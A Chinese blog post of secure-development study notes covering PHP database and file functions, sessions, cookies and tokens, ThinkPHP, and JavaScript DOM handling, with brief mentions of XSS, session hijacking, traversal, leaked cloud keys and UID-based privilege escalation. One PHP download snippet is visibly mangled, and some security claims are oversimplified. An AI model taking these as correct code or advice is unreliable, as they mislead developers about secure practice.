

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/phone_icon/hacker.png">
  <link rel="icon" href="/img/browser_icon/hacker.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="0z-sIHN">
  <meta name="keywords" content="">
  
    <meta name="description" content="安全开发‍ PHP‍ 原生类‍ 留言板功能‍ 数据库操作‍ PHP函数-连接，选择，执行，关闭等 参考：MySQLi函数 常用： mysqli_connect()​ 打开一个到MySQL的新的连接。 mysqli_select_db()​ 更改连接的默认数据库。 mysqli_query()​ 执行某个针对数据库的查询。 mysqli_fetch_row()​ 从结果集中取得一行，并作为枚举数组返">
<meta property="og:type" content="article">
<meta property="og:title" content="安全开发🧩">
<meta property="og:url" content="http://example.com/2024/07/05/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/index.html">
<meta property="og:site_name" content="0z-sIHN 的博客">
<meta property="og:description" content="安全开发‍ PHP‍ 原生类‍ 留言板功能‍ 数据库操作‍ PHP函数-连接，选择，执行，关闭等 参考：MySQLi函数 常用： mysqli_connect()​ 打开一个到MySQL的新的连接。 mysqli_select_db()​ 更改连接的默认数据库。 mysqli_query()​ 执行某个针对数据库的查询。 mysqli_fetch_row()​ 从结果集中取得一行，并作为枚举数组返">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/essay_cover_img/32.png">
<meta property="article:published_time" content="2024-07-05T06:00:00.000Z">
<meta property="article:modified_time" content="2024-11-10T14:41:16.743Z">
<meta property="article:author" content="0z-sIHN">
<meta property="article:tag" content="安全开发">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/essay_cover_img/32.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>安全开发🧩 - 0z-sIHN 的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0z-sIHN Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>联系我</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/essay_top_cover_bg/office.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="安全开发🧩"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-07-05 14:00" pubdate>
          2024年7月5日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          28k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          231 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">安全开发🧩</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a>安全开发</h1><p>‍</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>‍</p>
<h4 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h4><p>‍</p>
<h5 id="留言板功能"><a href="#留言板功能" class="headerlink" title="留言板功能"></a>留言板功能</h5><p>‍</p>
<h6 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h6><p>‍</p>
<p><strong>PHP函数-连接，选择，执行，关闭等</strong></p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-ref-mysqli.html">MySQLi函数</a></p>
<p>常用：</p>
<p><code>mysqli_connect()</code>​ 打开一个到MySQL的新的连接。</p>
<p><code>mysqli_select_db()</code>​ 更改连接的默认数据库。</p>
<p><code>mysqli_query()</code>​ 执行某个针对数据库的查询。</p>
<p><code>mysqli_fetch_row()</code>​ 从结果集中取得一行，并作为枚举数组返回。</p>
<p><code>mysqli_close()</code>​ 关闭先前打开的数据库连接。</p>
<p>‍</p>
<p><strong>MYSQL增删改查</strong></p>
<ol>
<li><p>查询select</p>
 <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 列名=‘条件’;<br></code></pre></td></tr></table></figure></li>
<li><p>删除delete</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 列名 = ‘条件’;<br></code></pre></td></tr></table></figure></li>
<li><p>增加insert</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into 表名(`列名<span class="hljs-number">1</span>`, `列名<span class="hljs-number">2</span>`) value(&#x27;列<span class="hljs-number">1</span>值<span class="hljs-number">1</span>&#x27;, ‘列<span class="hljs-number">2</span>值<span class="hljs-number">2</span>’);<br></code></pre></td></tr></table></figure></li>
<li><p>更新update</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> 表名 <span class="hljs-keyword">set</span> 列名 = 数据 <span class="hljs-keyword">where</span> 列名 = <span class="hljs-string">&#x27;条件&#x27;</span>；<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<h6 id="数据传递（全局变量）"><a href="#数据传递（全局变量）" class="headerlink" title="数据传递（全局变量）"></a>数据传递（全局变量）</h6><p>参考：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/php_superglobals.asp">PHP全局变量-超全局变量</a></p>
<pre><code class="hljs">   [PHP手册-超全局变量](https://www.php.net/manual/zh/language.variables.superglobals.php)
</code></pre>
<ul>
<li><p>$GLOBALS：这种全局变量用于在 PHP 脚本中的任意位置访问全局变量</p>
</li>
<li><p>$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息。</p>
</li>
<li><p>$_REQUEST ： $_REQUEST：用于收集 HTML 表单提交的数据。</p>
</li>
<li><p>$_POST：广泛用于收集提交method&#x3D;“post” 的HTML表单后的表单数据。</p>
</li>
<li><p>$_GET：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method&#x3D;“get”) $_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容。</p>
</li>
<li><p>$_ENV：是一个包含服务器端环境变量的数组。</p>
</li>
<li><p>$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容。</p>
</li>
<li><p>$_SESSION：是一个关联数组，包含当前脚本中的所有session内容。</p>
</li>
</ul>
<p>‍</p>
<h6 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h6><ul>
<li>留言板输出输入存在XSS</li>
<li>留言板使用第三方编辑器插件（编辑器插件漏洞）</li>
</ul>
<p>‍</p>
<p>‍</p>
<h5 id="后台验证功能"><a href="#后台验证功能" class="headerlink" title="后台验证功能"></a>后台验证功能</h5><p>‍</p>
<h6 id="鉴权技术"><a href="#鉴权技术" class="headerlink" title="鉴权技术"></a>鉴权技术</h6><ul>
<li><p>cookie</p>
<p>通俗点说cookie就像通讯录中的人，打过一次电话之后被记录在通讯录中，后续直接从通讯录中打就可以</p>
<p>生成cookie的原理图</p>
<p><img src="/assets/image-20240629143532-1ewrb89.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>session</p>
<p>通俗点说session就像打电话，电话没挂session就一直有效，挂了就直接失效</p>
<p>生成session的原理图</p>
</li>
<li><ol>
<li>客户端向服务器发送HTTP请求。</li>
<li>服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。</li>
<li>服务器将生成的session ID作为一个cookie发送给客户端。</li>
<li>客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。</li>
<li>当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。</li>
<li>服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。</li>
</ol>
<p><img src="/assets/image-20240629143629-ktl0i7c.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
<p>‍</p>
<p><strong>Cookie与Session的异同</strong></p>
<p>相同点：</p>
<ul>
<li>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制</li>
</ul>
<p>不同点：</p>
<ol>
<li><p>存储位置不同：<br> Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p>
</li>
<li><p>安全性不同：<br> Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p>
</li>
<li><p>存储容量不同：<br> Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p>
</li>
<li><p>生命周期不同：<br> Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p>
</li>
<li><p>访问方式不同：<br> Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p>
</li>
<li><p>使用场景不同：<br> Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p>
</li>
</ol>
<p>‍</p>
<h6 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h6><ul>
<li><p>token</p>
<ol>
<li><p>身份验证：<br> 采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。</p>
</li>
<li><p>安全性：<br> 采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。</p>
</li>
<li><p>跨域访问：<br> 采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。</p>
</li>
<li><p>总结<br> 总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</p>
</li>
</ol>
</li>
<li><p>判断数据包唯一性</p>
</li>
</ul>
<p>‍</p>
<h6 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h6><ul>
<li>cookie客户端获取并模拟用户</li>
<li>session会话劫持模拟用户</li>
</ul>
<p>‍</p>
<p>‍</p>
<h5 id="文件管理功能"><a href="#文件管理功能" class="headerlink" title="文件管理功能"></a>文件管理功能</h5><p>‍</p>
<h6 id="数据传递（全局变量）-1"><a href="#数据传递（全局变量）-1" class="headerlink" title="数据传递（全局变量）"></a>数据传递（全局变量）</h6><ul>
<li>$_GET</li>
<li>$_POST</li>
<li>$_FILES</li>
<li>$_REQUEST</li>
<li>$_SERVER</li>
</ul>
<p>‍</p>
<h6 id="安全问题-2"><a href="#安全问题-2" class="headerlink" title="安全问题"></a>安全问题</h6><ul>
<li><p>目录遍历</p>
</li>
<li><p>文件显示</p>
<ol>
<li>打开目录读取文件列表</li>
<li>递归循环读取文件列表</li>
<li>判断是文件还是文件夹</li>
<li>PHP.INI目录访问控制</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_dir</span>() 函数用于检查指定的路径是否是一个目录<br><span class="hljs-title function_ invoke__">opendir</span>() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录<br><span class="hljs-title function_ invoke__">readdir</span>() 函数用于从打开的目录句柄中读取目录中的文件和子目录<br>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-keyword">__DIR__</span>); 设置配置文件中，只能访问本目录<br></code></pre></td></tr></table></figure></li>
<li><p>文件编辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>() 读取文件内容<br><span class="hljs-title function_ invoke__">fopen</span>() <span class="hljs-title function_ invoke__">fread</span>() 文件打开读入<br></code></pre></td></tr></table></figure></li>
<li><p>文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">架构：<br><span class="hljs-number">1</span>、上传至服务器本身的存储磁盘(源码在一起)<br><span class="hljs-number">2</span>、云产品OSS存储对象去存储文件(泄漏安全：打开upload.js文件可能会泄露accessid和accesskey，如果有这两个东西，就可以使用OSS浏览器进行访问)<br><span class="hljs-number">3</span>、文件上传到其他域名（例如：www.test.com--&gt;upload.test.com并且此时upload.test.com没有配置任何可以解析文件的环境）<br></code></pre></td></tr></table></figure></li>
<li><p>文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>() 在错误发生后脚本继续执行<br><span class="hljs-keyword">require</span>() 在错误发生后脚本停止执行<br><span class="hljs-keyword">include_once</span>() 如果已经包含，则不再执行<br><span class="hljs-keyword">require_once</span>() 如果已经包含，则不再执行<br></code></pre></td></tr></table></figure></li>
<li><p>文件删除</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unlink</span>() 文件删除函数<br>调用命令删除：system shell_exec exec等<br></code></pre></td></tr></table></figure></li>
<li><p>文件下载</p>
<p>修改HTTP头实现文件读取解析下载：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">header</span>(“Content-<span class="hljs-attr">Type</span>: application/octet-stream”);<br><span class="hljs-title function_ invoke__">header</span>(“Content-<span class="hljs-attr">Disposition</span>: attachment; filename=”<span class="hljs-string">&quot;);</span><br><span class="hljs-string">header(&quot;</span>Content-<span class="hljs-attr">Length</span>: <span class="hljs-string">&quot; . filesize(file)) ;readfile( file));</span><br><span class="hljs-string">readfile(file));readfile(file);</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p>‍</p>
<h6 id="前端模板功能"><a href="#前端模板功能" class="headerlink" title="前端模板功能"></a>前端模板功能</h6><ul>
<li><p>安全问题</p>
<p>自写模板安全问题</p>
<p>第三方模板—如Smarty&lt;3.1.32模板漏洞</p>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h4 id="框架类-Thinkphp"><a href="#框架类-Thinkphp" class="headerlink" title="框架类-Thinkphp"></a>框架类-Thinkphp</h4><p>‍</p>
<h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>参考<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1/353946">ThinkPHP5.1完全开发手册</a></p>
<ul>
<li><p>配置架构-导入使用</p>
</li>
<li><p>前端页面渲染-MVC模型</p>
</li>
<li><p>路由访问-URL访问</p>
</li>
<li><p>文件上传-应用对象</p>
</li>
<li><p>数据库操作-应用对象</p>
</li>
</ul>
<p>‍</p>
<h5 id="安全问题-3"><a href="#安全问题-3" class="headerlink" title="安全问题"></a>安全问题</h5><ul>
<li>不合规写法</li>
<li>内置过滤绕过</li>
<li>版本安全漏洞</li>
</ul>
<p>‍</p>
<p><strong>逻辑越权原理：</strong> 在设计数据库的时候，仅仅使用UID来限制用户权限的等级，这种设计可以通过抓包的方法来修改UID的值获得更高的权限。</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h3><p>‍</p>
<p>‍</p>
<h4 id="原生类-1"><a href="#原生类-1" class="headerlink" title="原生类"></a>原生类</h4><p>特性：前端有代码</p>
<ol>
<li>原生JS教程<br> <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/js/index.asp">https://www.w3school.com.cn/js/index.asp</a></li>
<li>jQuery库教程<br> <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jquery/index.asp">https://www.w3school.com.cn/jquery/index.asp</a></li>
</ol>
<h5 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h5><ul>
<li>文件上传</li>
<li>登录验证</li>
<li>商品购买</li>
</ul>
<p>‍</p>
<h5 id="DOM树-文档操作对象"><a href="#DOM树-文档操作对象" class="headerlink" title="DOM树-文档操作对象"></a>DOM树-文档操作对象</h5><ul>
<li><p>获取HTML代码中函数的值，可以操作网页代码内容，实现自主或用户交互动作反馈</p>
</li>
<li><p>安全问题：本身的前端代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成DOM-XSS攻击！</p>
</li>
<li><p>获取对象</p>
<p>标签：直接写</p>
<p>Class：加上符号.</p>
<p>id：加上符号#</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这是标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br>document.querySelector(&#x27;h1&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br>document.querySelector(&#x27;.id&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br>document.querySelector(&#x27;#myHeader&#x27;)<br></code></pre></td></tr></table></figure></li>
<li><p>获取对象属性</p>
<p><code>console.log()</code>​ 是一个用于输出信息到控制台的方法，而 <code>const</code>​ 是一个关键字，用于声明只读的常量变量。它们在功能和用途上是完全不同的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 选择第一个 h1 元素</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> h1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 获取 h1 元素的 id 属性</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> id = h1.<span class="hljs-property">id</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 输出 id 到控制台</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(id);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
<li><p>操作元素数据</p>
<p><code>innerHTML</code>​ 解析后续代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">var element = document.getElementById(&quot;myElement&quot;);<br>var htmlContent = element.innerHTML; // 获取元素的内容（包括 HTML 标记）<br>element.innerHTML = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>New Content<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>&quot;; // 设置元素的内容，并解析 HTML 标记<br></code></pre></td></tr></table></figure>

<p><code>innerText</code>​ 不解析后续代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">var element = document.getElementById(&quot;myElement&quot;);<br>var textContent = element.innerText; // 获取元素的纯文本内容<br>element.innerText = &quot;New Text Content&quot;; // 设置元素的纯文本内容<br></code></pre></td></tr></table></figure></li>
<li><p>操作元素属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;iphone.jpg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> s=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;img&#x27;</span>)</span><br><span class="language-javascript">        s.<span class="hljs-property">src</span>=<span class="hljs-string">&#x27;huawei.png&#x27;</span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-property">src</span>)</span><br><span class="language-javascript">        <span class="hljs-comment">//如果这里huawei.png为一个变量由用户传递决定，那么就会造成DOM XSS**</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p>‍</p>
<h5 id="加密编码"><a href="#加密编码" class="headerlink" title="加密编码"></a>加密编码</h5><ul>
<li><p>分析代码过程：发出疑问如果加密格式不显示出来，怎样判断加密的方式是什么</p>
</li>
<li><p><strong>可以借助检查的控制台，尝试输入获取加密后的密码值，再和提交表单的加密值进行比对，若一致则证明识别出。（一般安全防护比较强的，不会把运行的所以东西全加载到浏览器上）</strong></p>
</li>
<li><p>第三方js</p>
<p>AES</p>
<p>DES</p>
<p>BASE64</p>
<p>….</p>
</li>
</ul>
<p>‍</p>
